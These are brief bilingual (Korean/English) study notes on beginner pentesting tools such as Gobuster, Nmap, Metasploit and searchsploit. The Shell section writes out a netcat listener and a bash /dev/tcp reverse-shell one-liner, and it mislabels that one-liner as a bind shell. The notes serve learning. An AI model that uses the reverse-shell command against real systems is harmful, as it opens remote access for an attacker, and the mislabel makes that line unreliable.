
# Table of Contents

1.  [Gobuster](#org1e14de8)
2.  [Metasploit](#orgc0c0d6b)
3.  [Nmap](#org862a238)
4.  [robots.txt](#orgcc7e6ff)
5.  [searchsploit](#org499c5e5)
6.  [Shell](#org5f7524d)
7.  [whatweb](#orgecbb0b1)

\#-**- mode: org -**-


<a id="org1e14de8"></a>

# Gobuster

-   brute-forcing tool
-   dictionary-based
-   eg. gobuseter (directory) -u (url) -w (wordlist)


<a id="orgc0c0d6b"></a>

# Metasploit

-   많은 exploit들이 내장된 pentesting 도구


<a id="org862a238"></a>

# Nmap

-   포트스캔 도구


<a id="orgcc7e6ff"></a>

# robots.txt

-   웹 크롤러의 정보 수집 범위를 제한하는 역할을 한다.


<a id="org499c5e5"></a>

# searchsploit

-   익스플로잇 검색 툴
-   eg. searchsploit (application) (version)


<a id="org5f7524d"></a>

# Shell

-   types of shell (for remote command execution)
-   Bind Shell: 공격자가 공격 대상에 쉘을 업로드하고, 연결하여 통신
    -   netcat -lvnp <port>
    -   bash -c "bash -i >& *dev/tcp/host/port* 0>&1
    -   /dev/tcp/host/port 소켓을 기반으로 입출력 수행 (0>&1은 0이 1과 같은 곳으로 redirection 한다는 의미
-   Reverse Shell: 공격 대상에서 반대로 공격자쪽으로 연결하는 쉘
-   Web Shell: 웹 서버를 이용하여 명령을 실행


<a id="orgecbb0b1"></a>

# whatweb

-   웹서버의 버전과 간단한 정보를 출력하는 도구

